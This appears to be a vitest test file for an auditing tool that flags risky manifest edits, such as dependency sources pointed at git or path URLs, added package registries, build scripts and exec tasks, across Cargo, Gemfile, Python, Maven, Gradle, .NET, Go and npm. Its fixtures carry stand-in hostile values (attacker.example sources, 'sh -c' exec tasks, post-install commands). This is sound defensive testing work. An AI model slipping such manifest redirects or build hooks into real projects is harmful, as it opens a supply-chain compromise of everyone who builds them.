import { describe, expect, it } from "vitest";
import { parseManifest } from "../src/analysis/manifests.js";
import { scanLockfile } from "../src/analysis/security.js";
import { fetchSnapshot, parseSource } from "../src/repo/fetch.js";
import { SENSITIVE_PATH } from "../src/session/audit.js";
import {
  approvePlan,
  auditSession,
  openWorkspace,
  recordPlan,
  recordSpec,
  startSession,
  traceSession,
} from "../src/session/workflow.js";
import { createRepo, MIT_TEXT, testConfig, writeFiles } from "./helpers.js";

const config = testConfig();

const SOURCE = {
  LICENSE: MIT_TEXT,
  "src/a.js": "exports.a = 1;\n",
};
const TARGET = {
  "package.json": '{"name":"t","private":true,"scripts":{"test":"node --test"}}',
  "src/app.js": "module.exports = 1;\n",
  ".gitignore": "node_modules/\n.env\n",
};
const SPEC = {
  name: "A",
  summary: "Adds A.",
  in_scope: ["A"],
  behaviors: ["A works"],
  acceptance_criteria: [{ id: "AC-1", given: "x", when: "y", then: "z", verification: "unit" }],
};
const IMPLEMENTATION = {
  "src/a.js": "exports.value = 1;\n",
  "tests/a.test.js": `require('node:test').test('value is one', () => {});\n`,
};
const planWith = (overrides: Record<string, unknown> = {}) => ({
  approach: "Port.",
  files: [
    { path: "src/a.js", action: "create", purpose: "A", acceptance_criteria: ["AC-1"] },
    { path: "tests/a.test.js", action: "create", purpose: "T", acceptance_criteria: ["AC-1"] },
  ],
  dependencies: { add: [] },
  verification: {
    commands: [{ name: "unit", command: "node --test --test-reporter=spec", kind: "test" }],
  },
  rollback: "Delete the branch.",
  ...overrides,
});

async function workspaceFor(plan: Record<string, unknown>, target: Record<string, string>) {
  const snapshot = await fetchSnapshot(parseSource(createRepo(SOURCE), config, true), config);
  const repo = createRepo(target);
  const session = await startSession(config, { snapshot_id: snapshot.id, target_path: repo, feature: "A" });
  await traceSession(config, session.id, { seeds: ["src/a.js"] });
  await recordSpec(config, session.id, SPEC);
  const planned = await recordPlan(config, session.id, plan);
  await approvePlan(config, session.id, {
    plan_hash: planned.planHash!,
    user_confirmation: "yes",
    via: "agent_attested",
  });
  const opened = await openWorkspace(config, session.id);
  return { id: session.id, worktree: opened.workspace!.path };
}

/** Records one manifest edit, audits it, and returns the findings on that file. */
async function findingsFor(
  file: string,
  before: string | null,
  after: string,
  { planned = true, plan = {} }: { planned?: boolean; plan?: Record<string, unknown> } = {},
) {
  const files: unknown[] = [...planWith().files];
  if (planned) {
    files.push({
      path: file,
      action: before === null ? "create" : "modify",
      purpose: "Edit",
      acceptance_criteria: [],
    });
  }
  const target = before === null ? TARGET : { ...TARGET, [file]: before };
  const { id, worktree } = await workspaceFor(planWith({ files, ...plan }), target);
  writeFiles(worktree, { ...IMPLEMENTATION, [file]: after });
  const { session } = await auditSession(config, id);
  return session.audit!.findings.filter((item) => item.file === file);
}

const ruleNames = (findings: { rule: string }[]): string[] => findings.map((item) => item.rule);

describe("dependency source is parsed", () => {
  it("keeps where each dependency comes from", () => {
    const sources = (rel: string, text: string) =>
      parseManifest(rel, text).map((dep) => [dep.name, dep.source]);
    expect(
      sources(
        "Cargo.toml",
        '[dependencies]\nserde = { version = "1", git = "https://x/serde.git" }\ntokio = "1.2"\n',
      ),
    ).toEqual([
      ["serde", 'git = "https://x/serde.git"'],
      ["tokio", undefined],
    ]);
    expect(sources("Cargo.toml", '[dependencies.serde]\nversion = "1"\npath = "../serde"\n')).toEqual([
      ["serde", 'path = "../serde"'],
    ]);
    expect(sources("Gemfile", "gem 'rails', '~> 7.0', github: 'rails/rails'\ngem 'puma'\n")).toEqual([
      ["rails", "'~> 7.0', github: 'rails/rails'"],
      ["puma", undefined],
    ]);
    expect(
      sources(
        "pyproject.toml",
        '[tool.poetry.dependencies]\nflask = "^3"\nx = {version = "1", git = "https://x"}\n',
      ),
    ).toEqual([
      ["flask", undefined],
      ["x", 'git = "https://x"'],
    ]);
    expect(
      sources("Pipfile", '[packages]\nrequests = "*"\nfoo = {git = "https://x/foo.git", ref = "main"}\n'),
    ).toEqual([
      ["requests", undefined],
      ["foo", 'git = "https://x/foo.git", ref = "main"'],
    ]);
  });
});

describe("dependency source is audited", () => {
  it.each([true, false])("flags a same-version Cargo source change (planned %s)", async (planned) => {
    const findings = await findingsFor(
      "Cargo.toml",
      '[package]\nname = "a"\n[dependencies]\nserde = "1.0"\n',
      '[package]\nname = "a"\n[dependencies]\nserde = { version = "1.0", git = "https://evil.example/serde.git" }\n',
      { planned },
    );
    expect(ruleNames(findings)).toContain("dependency.remote_source");
  });

  it.each([true, false])("flags a same-version Gemfile source change (planned %s)", async (planned) => {
    const findings = await findingsFor(
      "Gemfile",
      'source "https://rubygems.org"\ngem "rails", "~> 7.0"\n',
      'source "https://rubygems.org"\ngem "rails", "~> 7.0", github: "rails/rails"\n',
      { planned },
    );
    expect(ruleNames(findings)).toContain("dependency.remote_source");
  });

  it.each([true, false])("flags a same-version Poetry source change (planned %s)", async (planned) => {
    const findings = await findingsFor(
      "pyproject.toml",
      '[tool.poetry]\nname = "a"\n[tool.poetry.dependencies]\nflask = "^3"\n',
      '[tool.poetry]\nname = "a"\n[tool.poetry.dependencies]\nflask = {version = "^3", git = "https://evil.example/flask.git"}\n',
      { planned },
    );
    expect(ruleNames(findings)).toContain("dependency.remote_source");
  });

  it.each([true, false])("flags a same-version Pipfile source change (planned %s)", async (planned) => {
    const findings = await findingsFor(
      "Pipfile",
      '[packages]\nrequests = "*"\n',
      '[packages]\nrequests = {git = "https://evil.example/requests.git"}\n',
      { planned },
    );
    expect(ruleNames(findings)).toContain("dependency.remote_source");
  });

  it("flags a new approved dependency that carries a git source", async () => {
    const plan = {
      dependencies: {
        add: [{ name: "serde", version: "1.0", ecosystem: "cargo", dev: false, reason: "Serialize." }],
      },
    };
    const findings = await findingsFor(
      "Cargo.toml",
      '[package]\nname = "a"\n',
      '[package]\nname = "a"\n[dependencies]\nserde = { version = "1.0", git = "https://evil.example/serde.git" }\n',
      { plan },
    );
    expect(ruleNames(findings)).toContain("dependency.remote_source");
  });

  it("does not flag a git source that did not change", async () => {
    const plan = {
      dependencies: {
        add: [{ name: "tokio", version: "1.2", ecosystem: "cargo", dev: false, reason: "Async." }],
      },
    };
    const git = '[dependencies]\nserde = { version = "1.0", git = "https://x/serde.git" }\n';
    const findings = await findingsFor(
      "Cargo.toml",
      `[package]\nname = "a"\n${git}`,
      `[package]\nname = "a"\n${git}tokio = "1.2"\n`,
      { plan },
    );
    expect(ruleNames(findings)).not.toContain("dependency.remote_source");
  });

  it("does not flag a new approved dependency with a plain version", async () => {
    const plan = {
      dependencies: {
        add: [{ name: "serde", version: "1.0", ecosystem: "cargo", dev: false, reason: "Serialize." }],
      },
    };
    const findings = await findingsFor(
      "Cargo.toml",
      '[package]\nname = "a"\n',
      '[package]\nname = "a"\n[dependencies]\nserde = { version = "1.0", features = ["derive"] }\n',
      { plan },
    );
    expect(ruleNames(findings)).not.toContain("dependency.remote_source");
  });
});

describe("long-form dependency tables", () => {
  it("parses Poetry and Pipfile tables with their own source", () => {
    expect(
      parseManifest(
        "pyproject.toml",
        '[tool.poetry.dependencies.flask]\nversion = "^3"\ngit = "https://x/flask.git"\n',
      ).map((dep) => [dep.name, dep.version, dep.source]),
    ).toEqual([["flask", "^3", 'git = "https://x/flask.git"']]);
    expect(
      parseManifest("Pipfile", '[packages.requests]\nversion = "*"\npath = "../requests"\n').map((dep) => [
        dep.name,
        dep.version,
        dep.source,
      ]),
    ).toEqual([["requests", "*", 'path = "../requests"']]);
  });

  it.each([true, false])(
    "flags a same-version Poetry table that gains a git source (planned %s)",
    async (planned) => {
      const findings = await findingsFor(
        "pyproject.toml",
        '[tool.poetry]\nname = "a"\n[tool.poetry.dependencies.flask]\nversion = "^3"\n',
        '[tool.poetry]\nname = "a"\n[tool.poetry.dependencies.flask]\nversion = "^3"\ngit = "https://evil.example/flask.git"\n',
        { planned },
      );
      expect(ruleNames(findings)).toContain("dependency.remote_source");
    },
  );

  it.each([true, false])(
    "flags a same-version Pipfile table that gains a path source (planned %s)",
    async (planned) => {
      const findings = await findingsFor(
        "Pipfile",
        '[packages.requests]\nversion = "*"\n',
        '[packages.requests]\nversion = "*"\npath = "../requests"\n',
        { planned },
      );
      expect(ruleNames(findings)).toContain("dependency.remote_source");
    },
  );
});

const GO = "module example.com/app\n\ngo 1.22\n";
const GO_BLOCK = "module example.com/app\n\ngo 1.22\n\nreplace (\n\texample.com/a => ../a\n)\n";
const CARGO = '[package]\nname = "a"\n\n[dependencies]\nserde = "1.0"\n';
const CARGO_PATCH = '[package]\nname = "a"\n\n[patch.crates-io]\nfoo = { path = "../foo" }\n';
const GRADLE =
  "plugins {\n  id 'java'\n}\n\nrepositories {\n  mavenCentral()\n}\n\ndependencies {\n  implementation 'org.example:lib:1.0'\n}\n";
const GEMFILE = 'source "https://rubygems.org"\ngem "rails"\n';
const COMPOSER = '{\n  "name": "a/b",\n  "require": {\n    "php": ">=8.1"\n  }\n}\n';
const PYPROJECT = '[project]\nname = "a"\ndependencies = [\n  "httpx>=0.2",\n]\n';
const PIPFILE =
  '[[source]]\nurl = "https://pypi.org/simple"\nname = "pypi"\nverify_ssl = true\n\n[packages]\nrequests = "*"\n';
const POM =
  "<project>\n  <dependencies>\n    <dependency>\n      <groupId>g</groupId>\n      <artifactId>a</artifactId>\n      <version>1</version>\n    </dependency>\n  </dependencies>\n</project>\n";
const CSPROJ =
  '<Project Sdk="Microsoft.NET.Sdk">\n  <ItemGroup>\n    <PackageReference Include="Serilog" Version="3.0.0" />\n  </ItemGroup>\n</Project>\n';
const POM_REPOSITORY =
  "  <repositories>\n    <repository><id>a</id><url>https://a.example/m2</url></repository>\n  </repositories>\n</project>";

describe("planned manifests are checked for what redirects a build", () => {
  it.each([
    ["a go replace directive", "go.mod", GO, `${GO}\nreplace example.com/lib => ../lib\n`],
    [
      "a replace line inside an existing replace block",
      "go.mod",
      GO_BLOCK,
      GO_BLOCK.replace(")\n", "\texample.com/b => ../b\n)\n"),
    ],
    [
      "a line under an existing [patch.crates-io]",
      "Cargo.toml",
      CARGO_PATCH,
      CARGO_PATCH.replace(
        'foo = { path = "../foo" }\n',
        'foo = { path = "../foo" }\nserde = { path = "../serde" }\n',
      ),
    ],
    ["a [patch] table", "Cargo.toml", CARGO, `${CARGO}\n[patch.crates-io]\nserde = { path = "../serde" }\n`],
    [
      "a [target] setting",
      "Cargo.toml",
      CARGO,
      `${CARGO}\n[target.x86_64-unknown-linux-gnu]\nlinker = "evil"\n`,
    ],
    [
      "a [replace] table",
      "Cargo.toml",
      CARGO,
      `${CARGO}\n[replace]\n"serde:1.0.0" = { path = "../serde" }\n`,
    ],
    [
      "a package build key",
      "Cargo.toml",
      '[package]\nname = "a"\n',
      '[package]\nname = "a"\nbuild = "evil.rs"\n',
    ],
    [
      "a registries table",
      "Cargo.toml",
      CARGO,
      `${CARGO}[registries.evil]\nindex = "https://evil.example"\n`,
    ],
    ["a Gemfile source line", "Gemfile", GEMFILE, `${GEMFILE}source "https://evil.example"\n`],
    [
      "a Gemfile git_source line",
      "Gemfile",
      GEMFILE,
      `${GEMFILE}git_source(:evil) { |repo| "https://evil.example/#{repo}.git" }\n`,
    ],
    ["a Gemfile git: option", "Gemfile", GEMFILE, `${GEMFILE}gem "x", git: "https://evil.example/x.git"\n`],
    ["a Gemfile github: option", "Gemfile", GEMFILE, `${GEMFILE}gem "x", github: "evil/x"\n`],
    ["a Gemfile path: option", "Gemfile", GEMFILE, `${GEMFILE}gem "x", path: "../x"\n`],
    ["a Gemfile eval_gemfile line", "Gemfile", GEMFILE, `${GEMFILE}eval_gemfile "../other/Gemfile"\n`],
    ["a Gemfile plugin line", "Gemfile", GEMFILE, `${GEMFILE}plugin "evil"\n`],
    [
      "a gem inside an existing source block",
      "Gemfile",
      'source "https://rubygems.org" do\n  gem "rails"\nend\n',
      'source "https://rubygems.org" do\n  gem "rails"\n  gem "x"\nend\n',
    ],
    [
      "a composer repositories key",
      "composer.json",
      COMPOSER,
      COMPOSER.replace(
        "  }\n}",
        '  },\n  "repositories": [{"type": "vcs", "url": "https://evil.example/x.git"}]\n}',
      ),
    ],
    [
      "a composer script added to an existing scripts block",
      "composer.json",
      '{\n  "name": "a/b",\n  "scripts": {\n    "test": "phpunit"\n  }\n}\n',
      '{\n  "name": "a/b",\n  "scripts": {\n    "post-install-cmd": ["php evil.php"],\n    "test": "phpunit"\n  }\n}\n',
    ],
    [
      "a pyproject build-system table",
      "pyproject.toml",
      PYPROJECT,
      `${PYPROJECT}\n[build-system]\nrequires = ["evil"]\n`,
    ],
    [
      "a uv sources table",
      "pyproject.toml",
      PYPROJECT,
      `${PYPROJECT}\n[tool.uv.sources]\nhttpx = { git = "https://evil.example/httpx.git" }\n`,
    ],
    [
      "a uv index table",
      "pyproject.toml",
      PYPROJECT,
      `${PYPROJECT}\n[[tool.uv.index]]\nurl = "https://evil.example/simple"\n`,
    ],
    [
      "a poetry source table",
      "pyproject.toml",
      PYPROJECT,
      `${PYPROJECT}\n[[tool.poetry.source]]\nname = "evil"\nurl = "https://evil.example/simple"\n`,
    ],
    [
      "a Pipfile source",
      "Pipfile",
      PIPFILE,
      `${PIPFILE}\n[[source]]\nurl = "https://evil.example/simple"\nname = "evil"\n`,
    ],
    [
      "a pom repositories block",
      "pom.xml",
      POM,
      POM.replace(
        "</project>",
        "  <repositories>\n    <repository><id>evil</id><url>https://evil.example/m2</url></repository>\n  </repositories>\n</project>",
      ),
    ],
    [
      "a repository added inside an existing pom repositories block",
      "pom.xml",
      POM.replace("</project>", POM_REPOSITORY),
      POM.replace("</project>", POM_REPOSITORY).replace(
        "  </repositories>",
        "    <repository><id>evil</id><url>https://evil.example/m2</url></repository>\n  </repositories>",
      ),
    ],
    [
      "a pom pluginRepositories block",
      "pom.xml",
      POM,
      POM.replace(
        "</project>",
        "  <pluginRepositories>\n    <pluginRepository><id>evil</id><url>https://evil.example/m2</url></pluginRepository>\n  </pluginRepositories>\n</project>",
      ),
    ],
    [
      "a pom build plugin",
      "pom.xml",
      POM,
      POM.replace(
        "</project>",
        "  <build>\n    <plugins>\n      <plugin><groupId>x</groupId><artifactId>y</artifactId></plugin>\n    </plugins>\n  </build>\n</project>",
      ),
    ],
    [
      "a pom systemPath",
      "pom.xml",
      POM,
      POM.replace(
        "<version>1</version>",
        "<version>1</version>\n      <scope>system</scope>\n      <systemPath>/opt/lib/a.jar</systemPath>",
      ),
    ],
    [
      "a gradle maven repository",
      "build.gradle",
      GRADLE,
      GRADLE.replace("  mavenCentral()\n", "  mavenCentral()\n  maven { url 'https://evil.example/repo' }\n"),
    ],
    [
      "a gradle line inside an existing repositories block",
      "build.gradle",
      GRADLE,
      GRADLE.replace("  mavenCentral()\n", "  mavenCentral()\n  google()\n"),
    ],
    [
      "a gradle apply from",
      "build.gradle",
      GRADLE,
      `${GRADLE}\napply from: 'https://evil.example/x.gradle'\n`,
    ],
    [
      "a gradle Exec task",
      "build.gradle",
      GRADLE,
      `${GRADLE}\ntasks.register('evil', Exec) {\n  commandLine 'sh', '-c', 'id'\n}\n`,
    ],
    [
      "a gradle exec block",
      "build.gradle",
      GRADLE,
      `${GRADLE}\ntasks.register('evil') {\n  exec {\n    commandLine 'sh', '-c', 'id'\n  }\n}\n`,
    ],
    [
      "a gradle plugin",
      "build.gradle",
      GRADLE,
      GRADLE.replace("  id 'java'\n", "  id 'java'\n  id 'evil.plugin' version '1.0'\n"),
    ],
    [
      "a kotlin gradle maven repository",
      "build.gradle.kts",
      "repositories {\n  mavenCentral()\n}\n",
      'repositories {\n  mavenCentral()\n  maven { url = uri("https://evil.example/repo") }\n}\n',
    ],
    [
      "a csproj Target",
      "App.csproj",
      CSPROJ,
      CSPROJ.replace(
        "</Project>",
        '  <Target Name="Evil" BeforeTargets="Build">\n    <Exec Command="id" />\n  </Target>\n</Project>',
      ),
    ],
    [
      "a csproj Exec inside an existing Target",
      "App.csproj",
      CSPROJ.replace(
        "</Project>",
        '  <Target Name="Build2" AfterTargets="Build">\n    <Message Text="x" />\n  </Target>\n</Project>',
      ),
      CSPROJ.replace(
        "</Project>",
        '  <Target Name="Build2" AfterTargets="Build">\n    <Message Text="x" />\n    <Exec Command="id" />\n  </Target>\n</Project>',
      ),
    ],
    [
      "a csproj Import",
      "App.csproj",
      CSPROJ,
      CSPROJ.replace("</Project>", '  <Import Project="https://evil.example/x.props" />\n</Project>'),
    ],
    [
      "a csproj RestoreSources",
      "App.csproj",
      CSPROJ,
      CSPROJ.replace(
        "</Project>",
        "  <PropertyGroup>\n    <RestoreSources>https://evil.example/nuget</RestoreSources>\n  </PropertyGroup>\n</Project>",
      ),
    ],
  ])("raises manifest.sensitive_change for %s", async (_label, file, before, after) => {
    const findings = await findingsFor(file, before, after);
    expect(ruleNames(findings)).toContain("manifest.sensitive_change");
  });

  it("checks a planned manifest that is new", async () => {
    const findings = await findingsFor("go.mod", null, `${GO}replace example.com/lib => ../lib\n`);
    expect(ruleNames(findings)).toContain("manifest.sensitive_change");
  });

  it.each([
    [
      "a Cargo dependency table",
      "Cargo.toml",
      CARGO,
      `${CARGO}[dependencies.tokio]\nversion = "1.2"\n`,
      { name: "tokio", version: "1.2", ecosystem: "cargo" },
    ],
    [
      "an ordinary Cargo dependency line",
      "Cargo.toml",
      CARGO,
      `${CARGO}tokio = "1.2"\n`,
      { name: "tokio", version: "1.2", ecosystem: "cargo" },
    ],
    [
      "a multi-line pom dependency block",
      "pom.xml",
      POM,
      POM.replace(
        "  </dependencies>",
        "    <dependency>\n      <groupId>org.example</groupId>\n      <artifactId>lib</artifactId>\n      <version>2.0</version>\n    </dependency>\n  </dependencies>",
      ),
      { name: "org.example:lib", version: "2.0", ecosystem: "maven" },
    ],
    [
      "a Gemfile gem line",
      "Gemfile",
      GEMFILE,
      `${GEMFILE}gem "pg", "~> 1.5"\n`,
      { name: "pg", version: "~> 1.5", ecosystem: "rubygems" },
    ],
    [
      "a gradle dependency",
      "build.gradle",
      GRADLE,
      GRADLE.replace(
        "  implementation 'org.example:lib:1.0'\n",
        "  implementation 'org.example:lib:1.0'\n  implementation 'org.example:other:2.0'\n",
      ),
      { name: "org.example:other", version: "2.0", ecosystem: "maven" },
    ],
    [
      "a go require line",
      "go.mod",
      GO,
      `${GO}\nrequire example.com/x v1.2.3\n`,
      { name: "example.com/x", version: "v1.2.3", ecosystem: "go" },
    ],
    [
      "a composer require entry",
      "composer.json",
      COMPOSER,
      COMPOSER.replace('"php": ">=8.1"', '"php": ">=8.1",\n    "x/y": "^1"'),
      { name: "x/y", version: "^1", ecosystem: "packagist" },
    ],
    [
      "a Pipfile package",
      "Pipfile",
      PIPFILE,
      `${PIPFILE}flask = "*"\n`,
      { name: "flask", version: "*", ecosystem: "pypi" },
    ],
    [
      "a PEP 621 dependency",
      "pyproject.toml",
      PYPROJECT,
      PYPROJECT.replace('  "httpx>=0.2",\n', '  "httpx>=0.2",\n  "flask>=3",\n'),
      { name: "flask", version: ">=3", ecosystem: "pypi" },
    ],
    [
      "a csproj PackageReference",
      "App.csproj",
      CSPROJ,
      CSPROJ.replace(
        "  </ItemGroup>",
        '    <PackageReference Include="Newtonsoft.Json" Version="13.0.3" />\n  </ItemGroup>',
      ),
      { name: "Newtonsoft.Json", version: "13.0.3", ecosystem: "nuget" },
    ],
  ])("stays silent on %s", async (_label, file, before, after, dep) => {
    const plan = {
      dependencies: { add: [{ ...dep, dev: false, reason: "Needed." }] },
    };
    const findings = await findingsFor(file, before, after, { plan });
    expect(ruleNames(findings)).not.toContain("manifest.sensitive_change");
    expect(ruleNames(findings)).not.toContain("dependency.remote_source");
  });

  it("does not raise the sensitive finding when the plan states a reason", async () => {
    const findings = await findingsFor("go.mod", GO, `${GO}replace example.com/lib => ../lib\n`, {
      plan: { sensitive_paths_reason: "The fork is built in CI." },
    });
    expect(ruleNames(findings)).not.toContain("manifest.sensitive_change");
  });

  it("keeps the existing check for an unplanned manifest", async () => {
    const findings = await findingsFor("go.mod", GO, `${GO}replace example.com/lib => ../lib\n`, {
      planned: false,
    });
    expect(ruleNames(findings)).toContain("manifest.unplanned_change");
  });
});

const EVIL = "https://attacker.example/serde.git";
const CARGO_BASE = '[package]\nname = "a"\nversion = "0.1.0"\n\n[dependencies]\nserde = "1.0"\n';
const CARGO_HEAD = '[package]\nname = "a"\nversion = "0.1.0"\n\n';

describe("manifests are read as their tools read them", () => {
  it.each([
    ["a quoted key", `[dependencies]\nserde = { version = "1.0", "git" = "${EVIL}" }\n`],
    ["a literal key", `[dependencies]\nserde = { version = "1.0", 'git' = "${EVIL}" }\n`],
    ["dotted keys", `[dependencies]\nserde.version = "1.0"\nserde.git = "${EVIL}"\n`],
    ["a quoted table name", `[dependencies."serde"]\nversion = "1.0"\ngit = "${EVIL}"\n`],
    ["spaces in the header", `[ dependencies ]\nserde = { version = "1.0", git = "${EVIL}" }\n`],
    ["a comment on the header", `[dependencies] # runtime\nserde = { version = "1.0", git = "${EVIL}" }\n`],
    ["a swap for another crate", '[dependencies]\nserde = { version = "1.0", package = "serde-evil" }\n'],
  ])("sees a Cargo source through %s", async (_label, body) => {
    for (const planned of [true, false]) {
      const findings = await findingsFor("Cargo.toml", CARGO_BASE, `${CARGO_HEAD}${body}`, { planned });
      expect(ruleNames(findings)).toContain("dependency.remote_source");
    }
  });

  it("sees a git source in [workspace.dependencies]", async () => {
    const base = '[workspace]\nmembers = []\n\n[workspace.dependencies]\nserde = "1.0"\n';
    const findings = await findingsFor(
      "Cargo.toml",
      base,
      base.replace('serde = "1.0"', `serde = { version = "1.0", git = "${EVIL}" }`),
    );
    expect(ruleNames(findings)).toContain("dependency.remote_source");
  });

  it.each([
    ["a quoted patch table", `["patch".crates-io]\nserde = { git = "${EVIL}" }\n`],
    ["a quoted target table", "['target'.'cfg(unix)']\nlinker = \"evil\"\n"],
    ["a build script", null],
  ])("flags %s in a planned Cargo.toml", async (_label, body) => {
    const after =
      body === null
        ? CARGO_BASE.replace('version = "0.1.0"', 'version = "0.1.0"\nbuild = "evil.rs"')
        : `${CARGO_BASE}\n${body}`;
    const findings = await findingsFor("Cargo.toml", CARGO_BASE, after);
    expect(ruleNames(findings)).toContain("manifest.sensitive_change");
  });

  it("does not guess at a manifest it cannot parse", async () => {
    const findings = await findingsFor("Cargo.toml", CARGO_BASE, `${CARGO_BASE}serde = = "broken"\n`);
    expect(ruleNames(findings)).toContain("manifest.unparsed");
  });

  it("stays quiet about an ordinary Cargo edit, however it is spelled", async () => {
    const after = `${CARGO_HEAD}[dependencies] # runtime\n"serde" = { version = "1.0", features = ["derive"] }\n`;
    expect(await findingsFor("Cargo.toml", CARGO_BASE, after)).toEqual([]);
  });

  it("keeps a package that sits in two tables quiet", async () => {
    const text = `${CARGO_HEAD}[dependencies]\nserde = { version = "1.0", path = "../serde" }\n\n[dev-dependencies]\nserde = "1.0"\n`;
    expect(await findingsFor("Cargo.toml", text, `${text}\n`)).toEqual([]);
  });

  it.each([
    ["optional dependencies", '[project.optional-dependencies]\nextra = ["evil @ git+https://x/evil.git"]\n'],
    ["dependency groups", '[dependency-groups]\ntest = ["evil @ git+https://x/evil.git"]\n'],
    ["a Poetry group", '[tool.poetry.group.test.dependencies]\nevil = { git = "https://x/evil.git" }\n'],
    ["an indented key", '[project]\nname = "a"\n  dependencies = ["evil @ git+https://x/evil.git"]\n'],
    ["a spaced Poetry header", '[ tool.poetry.dependencies ]\nevil = { git = "https://x/evil.git" }\n'],
  ])("sees a new package in pyproject %s", async (_label, after) => {
    const findings = await findingsFor("pyproject.toml", '[project]\nname = "a"\n', after);
    expect(ruleNames(findings)).toContain("dependency.unapproved");
  });

  it("sees Pipfile dev packages", async () => {
    const findings = await findingsFor(
      "Pipfile",
      "[packages]\n",
      '[packages]\n\n[dev-packages]\nevil = {git = "https://x/evil.git"}\n',
    );
    expect(ruleNames(findings)).toContain("dependency.unapproved");
  });

  it.each([
    ["a remote include", "-r https://attacker.example/reqs.txt"],
    ["a joined index option", "-ihttps://attacker.example/simple"],
    ["a remote constraint", "--constraint=https://attacker.example/c.txt"],
  ])("flags %s in requirements", async (_label, line) => {
    const findings = await findingsFor("requirements.txt", "flask==3.0.0\n", `flask==3.0.0\n${line}\n`);
    expect(ruleNames(findings)).toContain("dependency.remote_source");
  });

  it("leaves harmless requirements options alone", async () => {
    const findings = await findingsFor(
      "requirements.txt",
      "flask==3.0.0\n",
      "-r base.txt\n--require-hashes\nflask==3.0.0\n",
    );
    expect(ruleNames(findings)).not.toContain("dependency.remote_source");
  });

  it.each([
    ["a git hash rocket", `gem "rails", "7.0", :git => "${EVIL}"`],
    ["a github hash rocket", 'gem "rails", "7.0", :github => "evil/rails"'],
    ["a path hash rocket", 'gem "rails", "7.0", :path => "../rails"'],
    ["a quoted hash key", `gem "rails", "7.0", "git" => "${EVIL}"`],
  ])("flags %s in a Gemfile", async (_label, line) => {
    const findings = await findingsFor("Gemfile", 'gem "rails", "7.0"\n', `${line}\n`);
    expect(ruleNames(findings)).toContain("dependency.remote_source");
  });

  it("flags a hash rocket on a continuation line", async () => {
    const findings = await findingsFor(
      "Gemfile",
      'gem "rails", "7.0"\n',
      `gem "rails", "7.0",\n  :git => "${EVIL}"\n`,
    );
    expect(ruleNames(findings)).toContain("manifest.sensitive_change");
  });

  it.each([
    "evil/lodash",
    "gitlab:evil/lodash",
    "bitbucket:evil/lodash",
    "git@github.com:evil/lodash.git",
    "Git+https://attacker.example/lodash.git",
    "HTTPS://attacker.example/lodash.tgz",
    "npm:evil-lodash@1.0.0",
  ])("flags the npm specifier %s even when approved", async (version) => {
    const add = [{ name: "lodash", version, ecosystem: "npm", reason: "Needed." }];
    const findings = await findingsFor(
      "package.json",
      '{"name":"t","private":true}',
      JSON.stringify({ name: "t", private: true, dependencies: { lodash: version } }),
      { plan: { dependencies: { add } } },
    );
    expect(ruleNames(findings)).toContain("dependency.remote_source");
  });

  it("reads a composer key however it is escaped", async () => {
    const findings = await findingsFor(
      "composer.json",
      '{"require":{}}',
      '{"require":{},"\\u0072epositories":[{"type":"vcs","url":"https://attacker.example/x"}]}',
    );
    expect(ruleNames(findings)).toContain("manifest.sensitive_change");
  });

  it.each([
    [
      "a Maven parent",
      "pom.xml",
      "<project>\n</project>\n",
      "<project>\n<parent><relativePath>../evil/pom.xml</relativePath></parent>\n</project>\n",
    ],
    [
      "a Gradle jar",
      "build.gradle",
      "dependencies {\n}\n",
      "dependencies {\n  implementation files('libs/evil.jar')\n}\n",
    ],
    [
      "a Gradle tree",
      "build.gradle",
      "dependencies {\n}\n",
      "dependencies {\n  implementation fileTree(dir: 'libs')\n}\n",
    ],
    [
      "a local DLL",
      "app.csproj",
      "<Project>\n</Project>\n",
      '<Project>\n<Reference Include="evil">\n<HintPath>..\\evil.dll</HintPath>\n</Reference>\n</Project>\n',
    ],
  ])("flags %s", async (_label, file, before, after) => {
    const findings = await findingsFor(file, before, after);
    expect(ruleNames(findings)).toContain("manifest.sensitive_change");
  });

  it("reads a Gradle dependency written with named arguments", async () => {
    const findings = await findingsFor(
      "build.gradle",
      "dependencies {\n}\n",
      "dependencies {\n  implementation group: 'evil', name: 'lib', version: '1.0'\n}\n",
    );
    expect(ruleNames(findings)).toContain("dependency.unapproved");
  });

  it("treats a lockfile entry from git as an unusual registry", () => {
    const lock = (resolved: string) => `{"packages":{"x":{"resolved":"${resolved}"}}}`;
    const hosts = (resolved: string) =>
      scanLockfile("package-lock.json", lock(resolved)).map((item) => item.excerpt);
    expect(hosts("git+ssh://git@github.com/attacker/left-pad.git#abc")[0]).toContain("git+ssh");
    expect(hosts("https://registry.npmjs.org/left-pad/-/left-pad-1.0.0.tgz")).toEqual([]);
    expect(hosts("packages/local")).toEqual([]);
  });
});

describe("files that steer a build need a stated reason", () => {
  it.each([
    ".cargo/config.toml",
    "build.rs",
    "go.work",
    "Directory.Build.props",
    "Directory.Build.targets",
    "Directory.Packages.props",
    "nuget.config",
    "NuGet.Config",
    ".mvn/extensions.xml",
    "settings.gradle.kts",
    ".pnpmfile.cjs",
    "setup.py",
    "packages/a/.vscode/tasks.json",
  ])("%s", (rel) => {
    expect(SENSITIVE_PATH.test(rel)).toBe(true);
  });

  it("leaves ordinary source alone", () => {
    for (const rel of ["src/build.ts", "src/setup.ts", "docs/global.md", "src/settings.ts"]) {
      expect(SENSITIVE_PATH.test(rel)).toBe(false);
    }
  });
});

describe("second review: redirects outside a plan", () => {
  it("flags a changed replace in an unplanned go.mod", async () => {
    const base = "module m\n\nrequire example.com/a v1.0.0\n\nreplace (\n\texample.com/a => ../a\n)\n";
    const findings = await findingsFor("go.mod", base, base.replace("../a", "../evil"), { planned: false });
    expect(ruleNames(findings)).toContain("manifest.sensitive_change");
  });

  it("flags a changed patch in an unplanned Cargo.toml", async () => {
    const base = `${CARGO_BASE}\n[patch.crates-io]\nserde = { path = "../serde" }\n`;
    const findings = await findingsFor("Cargo.toml", base, base.replace("../serde", "../evil/serde"), {
      planned: false,
    });
    expect(ruleNames(findings)).toContain("manifest.sensitive_change");
  });

  it("flags a project reference", async () => {
    const findings = await findingsFor(
      "app.csproj",
      "<Project>\n</Project>\n",
      '<Project>\n<ProjectReference Include="..\\evil\\Evil.csproj" />\n</Project>\n',
    );
    expect(ruleNames(findings)).toContain("manifest.sensitive_change");
  });

  it("takes an approved dependency under an existing target table", async () => {
    const base = `${CARGO_BASE}\n[target.'cfg(windows)'.dependencies]\nwinapi = "0.3"\n`;
    const after = `${base}libc = "0.2"\n`;
    const add = [{ name: "libc", version: "0.2", ecosystem: "cargo", reason: "Needed." }];
    const findings = await findingsFor("Cargo.toml", base, after, { plan: { dependencies: { add } } });
    expect(ruleNames(findings)).toEqual([]);
  });

